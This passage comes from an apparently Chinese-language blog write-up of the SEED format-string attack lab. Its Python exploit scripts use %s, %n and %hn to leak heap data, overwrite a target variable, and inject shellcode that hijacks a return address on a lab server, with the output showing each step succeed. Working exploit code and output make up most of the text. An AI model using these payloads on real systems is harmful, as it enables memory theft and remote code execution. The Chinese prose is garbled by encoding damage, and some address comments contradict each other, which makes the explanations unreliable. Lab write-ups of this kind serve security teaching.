class="hljs-number">5</span>dc_<span class="hljs-number">80</span>e<span class="hljs-number">5320</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_ffffd<span class="hljs-number">9</span>b<span class="hljs-number">4</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_dd_<span class="hljs-number">41414141</span>_<span class="hljs-number">5</span>f<span class="hljs-number">78255</span>f_<span class="hljs-number">255</span>f<span class="hljs-number">7825</span>_<span class="hljs-number">78255</span>f<span class="hljs-number">78</span>_<span class="hljs-number">5</span>f<span class="hljs-number">78255</span>f_<span class="hljs-number">255</span>f<span class="hljs-number">7825</span>_<span class="hljs-number">78255</span>f<span class="hljs-number">78</span>_<span class="hljs-number">5</span>f<span class="hljs-number">78255</span>f_<span class="hljs-number">255</span>f<span class="hljs-number">7825</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°41414141ï¼Œè¿™ä¸ªå°±æ˜¯æˆ‘ä»¬å†™çš„AAAA</p><p>æŠŠæ”¾åˆ°1.txté‡Œé¢ï¼Œè¾“å…¥å‘½ä»¤<code>grep -o &#39;_&#39; 1.txt | wc - l</code></p><p>1.txtï¼š</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">AAAA_<span class="hljs-number">11223344</span>_<span class="hljs-number">1000</span>_<span class="hljs-number">8049</span>db<span class="hljs-number">5</span>_<span class="hljs-number">80e5320</span>_<span class="hljs-number">80e61</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span>_ffffd<span class="hljs-number">300</span>_ffffd<span class="hljs-number">228</span>_<span class="hljs-number">80e62</span>d<span class="hljs-number">4</span>_<span class="hljs-number">80e5000</span>_ffffd<span class="hljs-number">2</span><span class="hljs-keyword">c</span><span class="hljs-number">8</span>_<span class="hljs-number">8049</span>f<span class="hljs-number">7</span>e_ffffd<span class="hljs-number">300</span>_<span class="hljs-number">0</span>_<span class="hljs-number">64</span>_<span class="hljs-number">8049</span>f<span class="hljs-number">47</span>_<span class="hljs-number">80e5320</span>_<span class="hljs-number">4</span>ff_ffffd<span class="hljs-number">3</span>dd_ffffd<span class="hljs-number">300</span>_<span class="hljs-number">80e5320</span>_<span class="hljs-number">80e9720</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_e<span class="hljs-number">2</span>fa<span class="hljs-number">4</span>d<span class="hljs-number">00</span>_<span class="hljs-number">80e5000</span>_<span class="hljs-number">80e5000</span>_ffffd<span class="hljs-number">8e8</span>_<span class="hljs-number">8049</span>eff_ffffd<span class="hljs-number">300</span>_dd_<span class="hljs-number">5</span>dc_<span class="hljs-number">80e5320</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_ffffd<span class="hljs-number">9</span>b<span class="hljs-number">4</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_dd_<span class="hljs-number">41414141</span><br></code></pre></td></tr></table></figure><p>64ä¸ª%x</p><h2 id="Task-2-B-Heap-Data"><a href="#Task-2-B-Heap-Data" class="headerlink" title="Task 2.B: Heap Data"></a>Task 2.B: Heap Data</h2><p>å·²çŸ¥ç§˜å¯†ä¿¡æ¯åœ°å€ä¸º0x080b4008</p><p>æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²æœ€å¼€å§‹åº”è¯¥æ˜¯ç§˜å¯†ä¿¡æ¯çš„åœ°å€ï¼Œç„¶åç”¨63ä¸ª%xè®©æŒ‡é’ˆç§»åŠ¨ï¼Œ64å°±æ˜¯ç§˜å¯†ä¿¡æ¯çš„ä½ç½®ï¼Œä½¿ç”¨%sæ‰“å°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><br><span class="hljs-keyword">import</span> sys<br>N = <span class="hljs-number">1500</span><br>content = <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0x0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(N)) <span class="hljs-comment">#å¡«å……0</span><br>secret  = <span class="hljs-number">0x080b4008</span> <span class="hljs-comment">#ç§˜å¯†ä¿¡æ¯çš„åœ°å€</span><br>content[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>]  =  (secret).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<span class="hljs-comment">#å°†æœ€å¼€å§‹çš„å†…å®¹æ”¹ä¸ºç§˜å¯†ä¿¡æ¯çš„åœ°å€</span><br>data = <span class="hljs-string">&quot;%x&quot;</span>*<span class="hljs-number">63</span>+<span class="hljs-string">&quot;\nmessage:%s&quot;</span><span class="hljs-comment">#åç§»</span><br>data = (data).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br>content[<span class="hljs-number">4</span>:<span class="hljs-number">4</span>+<span class="hljs-built_in">len</span>(data)] = data<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;bad&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>  f.write(content)<br><br></code></pre></td></tr></table></figure><p>å›æ˜¾</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dns">server-<span class="hljs-number">10.9.0.5</span> |@<br>                 <span class="hljs-number">1122334410008049d</span>b580e532080e61c0ffffd300ffffd22880e62d480e5000ffffd2c88049f7effffd3000648049f4780e53205dc5dcffffd300ffffd30080e97200000000000000000000000000151470080e500080e5000ffffd8e88049effffffd3005dc5dc80e5320000ffffd9b40005dc<br>server-<span class="hljs-number">10.9.0.5</span> | message:<span class="hljs-keyword">A</span> secret message<br></code></pre></td></tr></table></figure><h1 id="Task-3-Modifying-the-Server-Programâ€™s-Memory"><a href="#Task-3-Modifying-the-Server-Programâ€™s-Memory" class="headerlink" title="Task 3: Modifying the Server Programâ€™s Memory"></a>Task 3: Modifying the Server Programâ€™s Memory</h1><p>ä¿®æ”¹æœåŠ¡å™¨ç¨‹åºä¸­å®šä¹‰çš„ç›®æ ‡å˜é‡çš„å€¼(ç»§ç»­ä½¿ç”¨10.9.0.5)ã€‚Target çš„åŸå§‹å€¼æ˜¯0x11223344</p><h2 id="Task-3-A"><a href="#Task-3-A" class="headerlink" title="Task 3.A:"></a>Task 3.A:</h2><p>Change the value to a different value. In this sub-task, we need to change the content of<br>the target variable to something else. Your task is considered as a success if you can change it to a<br>different value, regardless of what value it may be. The address of the target variable can be found<br>from the server printout</p><p>æ”¹ä¸ºä»»æ„å€¼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br>  <br><span class="hljs-keyword">import</span> sys<br>N = <span class="hljs-number">1500</span><br>content = <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0x0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(N))<br>secret  = <span class="hljs-number">0x080e5068</span><br>content[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>]  =  (secret).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br>data = <span class="hljs-string">&quot;%x&quot;</span>*<span class="hljs-number">63</span>+<span class="hljs-string">&quot;\ntarget changed:%n&quot;</span><br>data = (data).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br>content[<span class="hljs-number">4</span>:<span class="hljs-number">4</span>+<span class="hljs-built_in">len</span>(data)] = data<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;bad&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>  f.write(content)<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">server</span>-<span class="hljs-number">10.9.0.5</span> | target changed:The target variable&#x27;s value (after):  <span class="hljs-number">0</span>x<span class="hljs-number">000000</span>fc<br></code></pre></td></tr></table></figure><h2 id="Task-3-B"><a href="#Task-3-B" class="headerlink" title="Task 3.B"></a>Task 3.B</h2><p> Change the value to 0x5000. In this sub-task, we need to change the content of the<br>target variable to a specific value 0x5000. Your task is considered as a success only if the vari-<br>ableâ€™s value becomes 0x5000.</p><p>å°†å€¼æ›´æ”¹ä¸º0x5000</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br>  <br><span class="hljs-keyword">import</span> sys<br>N = <span class="hljs-number">1500</span><br>content = <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0x0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(N))<br>secret  = <span class="hljs-number">0x080e5068</span><br>content[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>]  =  (secret).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br>data = <span class="hljs-string">&quot;%.8x&quot;</span>*<span class="hljs-number">62</span> + <span class="hljs-string">&quot;%.19980x&quot;</span> + <span class="hljs-string">&quot;%n&quot;</span><br>data = (data).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br>content[<span class="hljs-number">4</span>:<span class="hljs-number">4</span>+<span class="hljs-built_in">len</span>(data)] = data<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;bad&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>  f.write(content)<br><br></code></pre></td></tr></table></figure><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs maxima"><span class="hljs-number">0000000000005dcThe</span> target variable&#x27;s value (after):  <span class="hljs-number">0x00005000</span><br>server-<span class="hljs-number">10.9</span><span class="hljs-number">.0</span><span class="hljs-number">.5</span> | (^<span class="hljs-symbol">_</span>^)(^<span class="hljs-symbol">_</span>^)  Returned properly (^<span class="hljs-symbol">_</span>^)(^<span class="hljs-symbol">_</span>^)<br></code></pre></td></tr></table></figure><h2 id="Task-3-C"><a href="#Task-3-C" class="headerlink" title="Task 3.C"></a>Task 3.C</h2><p>Change the value to 0xAABBCCDD. This sub-task is similar to the previous one, except<br>that the target value is now a large number. In a format string attack, this value is the total number of<br>characters that are printed out by the printf() function; printing out this large number of characters<br>may take hours. You need to use a faster approach. The basic idea is to use %hn or %hhn, instead of<br>%n, so we can modify a two-byte (or one-byte) memory space, instead of four bytes. Printing out 216<br>characters does not take much time. More details can be found in the SEED book</p><p>å°†å€¼æ›´æ”¹ä¸º0xAABBCCDD</p><p>å…ˆçœ‹ä¸€ä¸‹0x080e5068å†…å­˜ç»„ç»‡ï¼Œç”±äºæ˜¯å°ç«¯å­˜å‚¨ï¼Œå› æ­¤ï¼š</p><ul><li>AA 0x080e506b </li><li>BB 0x080e506a</li><li>CC 0x080e5069 </li><li>DD 0x080e5068</li></ul><p>å…ˆè¯´ç»“è®ºï¼š<code>data = &quot;%.8x&quot;*62 + &quot;%.43199x&quot; + &quot;%hn&quot; + &quot;%.8738x&quot; + &quot;%hn&quot;</code></p><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/202303291557522.png"></p><p>è¿™ä¸ªå›¾ç»™å‡ºäº†å¡«å……å­—ç¬¦ä¸²çš„å¤§è‡´é›å½¢</p><ul><li>åœ°å€Aï¼šéœ€è¦æ›´æ”¹çš„å†…å­˜é«˜ä½ï¼Œä¸º0x080e506a</li><li>@@@@ï¼šå¯¹åº”åé¢%hn**%x**%hn</li><li>åœ°å€Bï¼šéœ€è¦æ›´æ”¹çš„å†…å­˜ä½ä½ï¼Œä¸º0x080e5068</li><li>%.8xï¼Œè¾“å‡ºå­—ç¬¦ï¼Œå¹¶ä¸”ç§»åŠ¨æŒ‡é’ˆ</li><li>%hnï¼šå¯¹åº”åœ°å€A</li><li>%xï¼šå¯¹åº”@@@@</li><li>%hnï¼šå¯¹åº”åœ°å€B</li></ul><p>AABB-12=43695</p><ul><li>â€œ%.8xâ€*62å°†æŒ‡é’ˆå‘ä¸Šç§»åŠ¨62æ¬¡ï¼Œå¹¶è¾“å‡º496ä¸ªå­—ç¬¦ã€‚43695-496=43199</li><li>â€œ%.43199xâ€æ‰“å°å‡º43199ä¸ªå­—ç¬¦ï¼Œå¹¶å°†æŒ‡é’ˆå‘ä¸Šç§»åŠ¨1æ¬¡</li><li>%hnæ”¹å˜åœ°å€å†…å®¹çš„çš„2ä¸ªå­—èŠ‚ï¼Œå¹¶å°†æŒ‡é’ˆå‘ä¸Šç§»åŠ¨1æ¬¡</li><li>â€œ%.8738xâ€æ‰“å°å‡º8738ä¸ªå­—ç¬¦ï¼Œå¹¶å°†æŒ‡é’ˆå‘ä¸Šç§»åŠ¨1æ¬¡</li><li>%hnæ”¹å˜åœ°å€å†…å®¹çš„çš„2ä¸ªå­—èŠ‚ï¼Œå¹¶å°†æŒ‡é’ˆå‘ä¸Šç§»åŠ¨1æ¬¡</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br>  <br><span class="hljs-keyword">import</span> sys<br>N = <span class="hljs-number">1500</span><br>content = <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0x0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(N))<br><br>add1  = <span class="hljs-number">0x080e5068</span><br>add2  = <span class="hljs-number">0x080e5068</span>+<span class="hljs-number">2</span><br>content[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>]  =  (add2).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>) <span class="hljs-comment">#AAAA</span><br>content[<span class="hljs-number">4</span>:<span class="hljs-number">8</span>]  =  (<span class="hljs-string">&quot;AAAA&quot;</span>).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br>content[<span class="hljs-number">8</span>:<span class="hljs-number">12</span>]  =  (add1).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><br>data = <span class="hljs-string">&quot;%.8x&quot;</span>*<span class="hljs-number">62</span> + <span class="hljs-string">&quot;%.43199x&quot;</span> + <span class="hljs-string">&quot;%hn&quot;</span> + <span class="hljs-string">&quot;%.8738x&quot;</span> + <span class="hljs-string">&quot;%hn&quot;</span><br>data = (data).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br>content[<span class="hljs-number">12</span>:<span class="hljs-number">12</span>+<span class="hljs-built_in">len</span>(data)] = data<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;bad&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>  f.write(content)<br></code></pre></td></tr></table></figure><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs maxima"><span class="hljs-number">0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000041414141The</span> target variable&#x27;s value (after):  <span class="hljs-number">0xaabbccdd</span><br>server-<span class="hljs-number">10.9</span><span class="hljs-number">.0</span><span class="hljs-number">.5</span> | (^<span class="hljs-symbol">_</span>^)(^<span class="hljs-symbol">_</span>^)  Returned properly (^<span class="hljs-symbol">_</span>^)(^<span class="hljs-symbol">_</span>^)<br></code></pre></td></tr></table></figure><h1 id="Task-4-Inject-Malicious-Code-into-the-Server-Program"><a href="#Task-4-Inject-Malicious-Code-into-the-Server-Program" class="headerlink" title="Task 4: Inject Malicious Code into the Server Program"></a>Task 4: Inject Malicious Code into the Server Program</h1><p>å°†ä¸€æ®µæ¶æ„ä»£ç ï¼Œä»¥äºŒè¿›åˆ¶æ ¼å¼æ³¨å…¥åˆ°æœåŠ¡å™¨çš„å†…å­˜ä¸­ï¼Œç„¶åä½¿ç”¨æ ¼å¼å­—ç¬¦ä¸²æ¼æ´ä¿®æ”¹å‡½æ•°çš„è¿”å›åœ°å€å­—æ®µï¼Œå› æ­¤å½“å‡½æ•°è¿”å›æ—¶ï¼Œå®ƒè·³è½¬åˆ°æˆ‘ä»¬æ³¨å…¥çš„ä»£ç ã€‚è¿™ä¸ªä»»åŠ¡ä½¿ç”¨çš„æŠ€æœ¯ä¸å‰ä¸€ä¸ªä»»åŠ¡ç›¸ä¼¼: å®ƒä»¬éƒ½ä¿®æ”¹å†…å­˜ä¸­çš„4å­—èŠ‚æ•°ã€‚å‰ä¸€ä¸ªä»»åŠ¡ä¿®æ”¹ç›®æ ‡å˜é‡ï¼Œè€Œæ­¤ä»»åŠ¡ä¿®æ”¹å‡½æ•°çš„è¿”å›åœ°å€å­—æ®µ</p><h2 id="Understanding-the-Stack-Layout"><a href="#Understanding-the-Stack-Layout" class="headerlink" title="Understanding the Stack Layout"></a>Understanding the Stack Layout</h2><p>é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦æ ¹æ®æœåŠ¡å™¨æ‰“å°å‡ºæ¥çš„ä¿¡æ¯è®¡ç®—å‡ºè¿”å›åœ°å€å­—æ®µçš„åœ°å€</p><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/202303291653197.png"></p><h3 id="Question-1-What-are-the-memory-addresses-at-the-locations-marked-by-2-and-3"><a href="#Question-1-What-are-the-memory-addresses-at-the-locations-marked-by-2-and-3" class="headerlink" title="Question 1: What are the memory addresses at the locations marked by 2 and 3"></a>Question 1: What are the memory addresses at the locations marked by 2 and 3</h3><p>2ï¼šebp+4=0xffffd538+4=FFFFD53Cï¼ˆmyprintfè¿”å›åœ°å€ï¼‰</p><p>3 ï¼š0xffffd610ï¼ˆbufferçš„åœ°å€ï¼‰</p><blockquote><p>Frame Pointer (inside myprintf):      0xffffd538</p><p>The input bufferâ€™s address:    0xffffd610</p></blockquote><h3 id="Question-2-How-many-x-format-specifiers-do-we-need-to-move-the-format-string-argument-pointer-to-3-ï¼Ÿ-Remember-the-argument-pointer-starts-from-the-location-above-1"><a href="#Question-2-How-many-x-format-specifiers-do-we-need-to-move-the-format-string-argument-pointer-to-3-ï¼Ÿ-Remember-the-argument-pointer-starts-from-the-location-above-1" class="headerlink" title="Question 2: How many %x format specifiers do we need to move the format string argument pointer to 3 ï¼Ÿ Remember, the argument pointer starts from the location above  1"></a>Question 2: How many %x format specifiers do we need to move the format string argument pointer to 3 ï¼Ÿ Remember, the argument pointer starts from the location above  1</h3><p>64</p><h2 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode"></a>Shellcode</h2><p>è¿™é‡Œåœ°å€è¦è®¡ç®—æ­£ç¡®ï¼Œåå…­è¿›åˆ¶å‡åè¿›åˆ¶è¢«Windowsè‡ªå¸¦çš„è®¡ç®—å™¨å‘æƒ¨äº†nnnd</p><ul><li><strong>bufçš„åœ°å€ï¼š0xffffd610</strong></li><li>shellcodeçš„åœ°å€ï¼š0xffffd610+0d1364=0xffffdb64</li><li>ebpçš„åœ°å€ï¼š0xffffd538</li><li><strong>è¿”å›åœ°å€ï¼š0xffffd538+0x4=0xFFFFD53C</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-comment"># 32-bit Generic Shellcode </span><br>shellcode_32 = (<br>   <span class="hljs-string">&quot;\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b&quot;</span><br>   <span class="hljs-string">&quot;\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54&quot;</span><br>   <span class="hljs-string">&quot;\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff&quot;</span><br>   <span class="hljs-string">&quot;/bin/bash*&quot;</span><br>   <span class="hljs-string">&quot;-c*&quot;</span><br>   <span class="hljs-comment"># The * in this line serves as the position marker         *</span><br>   <span class="hljs-string">&quot;/bin/ls -l; echo &#x27;===== Success! ======&#x27;                  *&quot;</span><br>   <span class="hljs-string">&quot;AAAA&quot;</span>   <span class="hljs-comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span><br>   <span class="hljs-string">&quot;BBBB&quot;</span>   <span class="hljs-comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span><br>   <span class="hljs-string">&quot;CCCC&quot;</span>   <span class="hljs-comment"># Placeholder for argv[2] --&gt; the command string</span><br>   <span class="hljs-string">&quot;DDDD&quot;</span>   <span class="hljs-comment"># Placeholder for argv[3] --&gt; NULL</span><br>).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br><br><br><span class="hljs-comment"># 64-bit Generic Shellcode </span><br>shellcode_64 = (<br>   <span class="hljs-string">&quot;\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48&quot;</span><br>   <span class="hljs-string">&quot;\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48&quot;</span><br>   <span class="hljs-string">&quot;\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31&quot;</span><br>   <span class="hljs-string">&quot;\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff&quot;</span><br>   <span class="hljs-string">&quot;/bin/bash*&quot;</span><br>   <span class="hljs-string">&quot;-c*&quot;</span><br>   <span class="hljs-comment"># The * in this line serves as the position marker         *</span><br>   <span class="hljs-string">&quot;/bin/ls -l; echo &#x27;===== Success! ======&#x27;                  *&quot;</span><br>   <span class="hljs-string">&quot;AAAAAAAA&quot;</span>   <span class="hljs-comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span><br>   <span class="hljs-string">&quot;BBBBBBBB&quot;</span>   <span class="hljs-comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span><br>   <span class="hljs-string">&quot;CCCCCCCC&quot;</span>   <span class="hljs-comment"># Placeholder for argv[2] --&gt; the command string</span><br>   <span class="hljs-string">&quot;DDDDDDDD&quot;</span>   <span class="hljs-comment"># Placeholder for argv[3] --&gt; NULL</span><br>).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br><br>N = <span class="hljs-number">1500</span><br><span class="hljs-comment"># Fill the content with NOP&#x27;s</span><br>content = <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0x90</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(N))<br><br><span class="hljs-comment"># Choose the shellcode version based on your target</span><br>shellcode = shellcode_32<br><br><span class="hljs-comment"># Put the shellcode somewhere in the payload</span><br>start = <span class="hljs-number">1500</span>-<span class="hljs-built_in">len</span>(shellcode)       <span class="hljs-comment">#0d1364       </span><br>content[start:start + <span class="hljs-built_in">len</span>(shellcode)] = shellcode<br><br> <span class="hljs-comment">#        ffff                 db64</span><br><span class="hljs-comment">#0xFFFFD53C+2            0xFFFFD53C</span><br><br>ret_addr=<span class="hljs-number">0xFFFFD53C</span><br><br>ret_addr_low=ret_addr     <span class="hljs-comment"># DA90</span><br>ret_addr_high=ret_addr+<span class="hljs-number">2</span>  <span class="hljs-comment"># FFFF</span><br><br><span class="hljs-comment">#change retaddr into 0xffffd610+0d1364=0xffff DA90</span><br><br><span class="hljs-comment"># new_ret=ret_addr+1364</span><br><br>content[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>]=(ret_addr_low).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><br>content[<span class="hljs-number">4</span>:<span class="hljs-number">8</span>]=(<span class="hljs-string">&quot;AAAA&quot;</span>).encode(<span class="hljs-string">&quot;latin-1&quot;</span>)<br><br>content[<span class="hljs-number">8</span>:<span class="hljs-number">12</span>]=(ret_addr_high).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><span class="hljs-comment">#0xDA90-12-8*62=55952-508=55444</span><br>data = <span class="hljs-string">&quot;%.8x&quot;</span>*<span class="hljs-number">62</span> + <span class="hljs-string">&quot;%.55444x&quot;</span> + <span class="hljs-string">&quot;%hn&quot;</span> + <span class="hljs-string">&quot;%.9583x&quot;</span> + <span class="hljs-string">&quot;%hn&quot;</span><br>data = (data).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br>content[<span class="hljs-number">12</span>:<span class="hljs-number">12</span>+<span class="hljs-built_in">len</span>(data)] = data<br><br><span class="hljs-comment"># Save the format string to file</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;badfile&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>  f.write(content)<br><br></code></pre></td></tr></table></figure><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs tap">ï¿½KPï¿½CTï¿½KH1ï¿½1ï¿½ï¿½5 | ï¿½KLï¿½K<br>              ï¿½ï¿½ï¿½ï¿½ï¿½/bin/bash*-c*/bin/ls -l; echo &#x27;===== Success! ======&#x27;                  *AAAABBBBCCCCDDDDThe target variable&#x27;s value (after):  0x11223344<br>server-10.9.0.5 | total 